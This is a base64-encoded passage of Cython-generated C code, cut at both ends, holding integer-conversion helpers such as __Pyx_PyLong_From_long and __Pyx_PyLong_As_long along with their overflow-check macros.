YW1lLCBweV9saW5lKTtcbiAgICBQeVRyYWNlQmFja19IZXJlKHB5X2ZyYW1lKTtcbmJhZDpcbiAgICBQeV9YREVDUkVGKHB5X2NvZGUpO1xuICAgIFB5X1hERUNSRUYocHlfZnJhbWUpO1xufVxuI2VuZGlmXG5cblxuI2RlZmluZSBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlKVxcXG4gICAgX19QWVhfX1ZFUklGWV9SRVRVUk5fSU5UKHRhcmdldF90eXBlLCBmdW5jX3R5cGUsIGZ1bmNfdmFsdWUsIDApXG4jZGVmaW5lIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlKVxcXG4gICAgX19QWVhfX1ZFUklGWV9SRVRVUk5fSU5UKHRhcmdldF90eXBlLCBmdW5jX3R5cGUsIGZ1bmNfdmFsdWUsIDEpXG4jZGVmaW5lIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCBleGMpXFxcbiAgICB7XFxcbiAgICAgICAgZnVuY190eXBlIHZhbHVlID0gZnVuY192YWx1ZTtcXFxuICAgICAgICBpZiAoc2l6ZW9mKHRhcmdldF90eXBlKSA8IHNpemVvZihmdW5jX3R5cGUpKSB7XFxcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSh2YWx1ZSAhPSAoZnVuY190eXBlKSAodGFyZ2V0X3R5cGUpIHZhbHVlKSkge1xcXG4gICAgICAgICAgICAgICAgZnVuY190eXBlIHplcm8gPSAwO1xcXG4gICAgICAgICAgICAgICAgaWYgKGV4YyAmJiB1bmxpa2VseSh2YWx1ZSA9PSAoZnVuY190eXBlKS0xICYmIFB5RXJyX09jY3VycmVkKCkpKVxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAodGFyZ2V0X3R5cGUpIC0xO1xcXG4gICAgICAgICAgICAgICAgaWYgKGlzX3Vuc2lnbmVkICYmIHVubGlrZWx5KHZhbHVlIDwgemVybykpXFxcbiAgICAgICAgICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XFxcbiAgICAgICAgICAgICAgICBlbHNlXFxcbiAgICAgICAgICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdztcXFxuICAgICAgICAgICAgfVxcXG4gICAgICAgIH1cXFxuICAgICAgICByZXR1cm4gKHRhcmdldF90eXBlKSB2YWx1ZTtcXFxuICAgIH1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0Zyb21fbG9uZyhsb25nIHZhbHVlKSB7XG4jaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDXG4jcHJhZ21hIEdDQyBkaWFnbm9zdGljIHB1c2hcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgaWdub3JlZCAiLVdjb252ZXJzaW9uIlxuI2VuZGlmXG4gICAgY29uc3QgbG9uZyBuZWdfb25lID0gKGxvbmcpIC0xLCBjb25zdF96ZXJvID0gKGxvbmcpIDA7XG4jaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDXG4jcHJhZ21hIEdDQyBkaWFnbm9zdGljIHBvcFxuI2VuZGlmXG4gICAgY29uc3QgaW50IGlzX3Vuc2lnbmVkID0gbmVnX29uZSA+IGNvbnN0X3plcm87XG4gICAgaWYgKGlzX3Vuc2lnbmVkKSB7XG4gICAgICAgIGlmIChzaXplb2YobG9uZykgPCBzaXplb2YobG9uZykpIHtcbiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoKGxvbmcpIHZhbHVlKTtcbiAgICAgICAgfSBlbHNlIGlmIChzaXplb2YobG9uZykgPD0gc2l6ZW9mKHVuc2lnbmVkIGxvbmcpKSB7XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21VbnNpZ25lZExvbmcoKHVuc2lnbmVkIGxvbmcpIHZhbHVlKTtcbiNpZiBkZWZpbmVkKEhBVkVfTE9OR19MT05HKSAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgICAgIH0gZWxzZSBpZiAoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBQWV9MT05HX0xPTkcpKSB7XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21VbnNpZ25lZExvbmdMb25nKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpIHZhbHVlKTtcbiNlbmRpZlxuICAgICAgICB9XG4gICAgfSBlbHNlIHtcbiAgICAgICAgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YobG9uZykpIHtcbiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoKGxvbmcpIHZhbHVlKTtcbiNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgICAgICB9IGVsc2UgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YoUFlfTE9OR19MT05HKSkge1xuICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZ0xvbmcoKFBZX0xPTkdfTE9ORykgdmFsdWUpO1xuI2VuZGlmXG4gICAgICAgIH1cbiAgICB9XG4gICAge1xuICAgICAgICB1bnNpZ25lZCBjaGFyICpieXRlcyA9ICh1bnNpZ25lZCBjaGFyICopJnZhbHVlO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTRcbiAgICAgICAgaWYgKGlzX3Vuc2lnbmVkKSB7XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21VbnNpZ25lZE5hdGl2ZUJ5dGVzKGJ5dGVzLCBzaXplb2YodmFsdWUpLCAtMSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21OYXRpdmVCeXRlcyhieXRlcywgc2l6ZW9mKHZhbHVlKSwgLTEpO1xuICAgICAgICB9XG4jZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDBcbiAgICAgICAgaW50IG9uZSA9IDE7IGludCBsaXR0bGUgPSAoaW50KSoodW5zaWduZWQgY2hhciAqKSZvbmU7XG4gICAgICAgIHJldHVybiBfUHlMb25nX0Zyb21CeXRlQXJyYXkoYnl0ZXMsIHNpemVvZihsb25nKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaXR0bGUsICFpc191bnNpZ25lZCk7XG4jZWxzZVxuICAgICAgICBpbnQgb25lID0gMTsgaW50IGxpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTtcbiAgICAgICAgUHlPYmplY3QgKmZyb21fYnl0ZXMsICpyZXN1bHQgPSBOVUxMLCAqa3dkcyA9IE5VTEw7XG4gICAgICAgIFB5T2JqZWN0ICpweV9ieXRlcyA9IE5VTEwsICpvcmRlcl9zdHIgPSBOVUxMO1xuICAgICAgICBmcm9tX2J5dGVzID0gUHlPYmplY3RfR2V0QXR0clN0cmluZygoUHlPYmplY3QqKSZQeUxvbmdfVHlwZSwgImZyb21fYnl0ZXMiKTtcbiAgICAgICAgaWYgKCFmcm9tX2J5dGVzKSByZXR1cm4gTlVMTDtcbiAgICAgICAgcHlfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKChjaGFyKilieXRlcywgc2l6ZW9mKGxvbmcpKTtcbiAgICAgICAgaWYgKCFweV9ieXRlcykgZ290byBsaW1pdGVkX2JhZDtcbiAgICAgICAgb3JkZXJfc3RyID0gUHlVbmljb2RlX0Zyb21TdHJpbmcobGl0dGxlID8gImxpdHRsZSIgOiAiYmlnIik7XG4gICAgICAgIGlmICghb3JkZXJfc3RyKSBnb3RvIGxpbWl0ZWRfYmFkO1xuICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqYXJnc1szKyhDWVRIT05fVkVDVE9SQ0FMTCA/IDEgOiAwKV0gPSB7IE5VTEwsIHB5X2J5dGVzLCBvcmRlcl9zdHIgfTtcbiAgICAgICAgICAgIGlmICghaXNfdW5zaWduZWQpIHtcbiAgICAgICAgICAgICAgICBrd2RzID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygxKTtcbiAgICAgICAgICAgICAgICBpZiAoIWt3ZHMpIGdvdG8gbGltaXRlZF9iYWQ7XG4gICAgICAgICAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cigic2lnbmVkIiwgX19QeXhfTmV3UmVmKFB5X1RydWUpLCBrd2RzLCBhcmdzKzMsIDApIDwgMCkgZ290byBsaW1pdGVkX2JhZDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihmcm9tX2J5dGVzLCBhcmdzKzEsIDIgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQsIGt3ZHMpO1xuICAgICAgICB9XG4gICAgICAgIGxpbWl0ZWRfYmFkOlxuICAgICAgICBQeV9YREVDUkVGKGt3ZHMpO1xuICAgICAgICBQeV9YREVDUkVGKG9yZGVyX3N0cik7XG4gICAgICAgIFB5X1hERUNSRUYocHlfYnl0ZXMpO1xuICAgICAgICBQeV9YREVDUkVGKGZyb21fYnl0ZXMpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuI2VuZGlmXG4gICAgfVxufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGxvbmcgX19QeXhfUHlMb25nX0FzX2xvbmcoUHlPYmplY3QgKngpIHtcbiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUNcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcHVzaFxuI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBpZ25vcmVkICItV2NvbnZlcnNpb24iXG4jZW5kaWZcbiAgICBjb25zdCBsb25nIG5lZ19vbmUgPSAobG9uZykgLTEsIGNvbnN0X3plcm8gPSAobG9uZykgMDtcbiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUNcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcG9wXG4jZW5kaWZcbiAgICBjb25zdCBpbnQgaXNfdW5zaWduZWQgPSBuZWdfb25lID4gY29uc3RfemVybztcbiAgICBpZiAodW5saWtlbHkoIVB5TG9uZ19DaGVjayh4KSkpIHtcbiAgICAgICAgbG9uZyB2YWw7XG4gICAgICAgIFB5T2JqZWN0ICp0bXAgPSBfX1B5eF9QeU51bWJlcl9Mb25nKHgpO1xuICAgICAgICBpZiAoIXRtcCkgcmV0dXJuIChsb25nKSAtMTtcbiAgICAgICAgdmFsID0gX19QeXhfUHlMb25nX0FzX2xvbmcodG1wKTtcbiAgICAgICAgUHlfREVDUkVGKHRtcCk7XG4gICAgICAgIHJldHVybiB2YWw7XG4gICAgfVxuICAgIGlmIChpc191bnNpZ25lZCkge1xuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfUHlMb25nX0lzTmVnKHgpKSkge1xuICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XG4gICAgICAgIH0gZWxzZSBpZiAoX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgX19QeXhfY29tcGFjdF91cHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkpXG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyh4KTtcbiAgICAgICAgICAgIGFzc2VydChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSA+IDEpO1xuICAgICAgICAgICAgc3dpdGNoIChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSkge1xuICAgICAgICAgICAgICAgIGNhc2UgMjpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMSAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSA+PSAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgoKChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgMzpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID49IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIDQ6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID49IDQgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKChsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE3XG4gICAgICAgIGlmICh1bmxpa2VseShQeV9TSVpFKHgpIDwgMCkpIHtcbiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xuICAgICAgICB9XG4jZWxzZVxuICAgICAgICB7XG4gICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHgsIFB5X0ZhbHNlLCBQeV9MVCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpXG4gICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAtMTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gMSkpXG4gICAgICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XG4gICAgICAgIH1cbiNlbmRpZlxuICAgICAgICBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YodW5zaWduZWQgbG9uZykpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMobG9uZywgdW5zaWduZWQgbG9uZywgUHlMb25nX0FzVW5zaWduZWRMb25nKHgpKVxuI2lmZGVmIEhBVkVfTE9OR19MT05HXG4gICAgICAgIH0gZWxzZSBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YodW5zaWduZWQgUFlfTE9OR19MT05HKSkpIHtcbiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhsb25nLCB1bnNpZ25lZCBQWV9MT05HX0xPTkcsIFB5TG9uZ19Bc1Vuc2lnbmVkTG9uZ0xvbmcoeCkpXG4jZW5kaWZcbiAgICAgICAgfVxuICAgIH0gZWxzZSB7XG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICAgICAgIGlmIChfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBfX1B5eF9jb21wYWN0X3B5bG9uZywgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KSlcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpO1xuICAgICAgICAgICAgYXNzZXJ0KF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpID4gMSk7XG4gICAgICAgICAgICBzd2l0Y2ggKF9fUHl4X1B5TG9uZ19TaWduZWREaWdpdENvdW50KHgpKSB7XG4gICAgICAgICAgICAgICAgY2FzZSAtMjpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIGxvbmcsIC0obG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgobG9uZyktMSkqKCgoKChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIDI6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgoKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgLTM6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBsb25nLCAtKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgobG9uZyktMSkqKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgMzpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgLTQ6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBsb25nLCAtKGxvbmcpICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDQgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKChsb25nKS0xKSooKCgoKCgoKChsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIDQ6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDQgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKCgobG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAg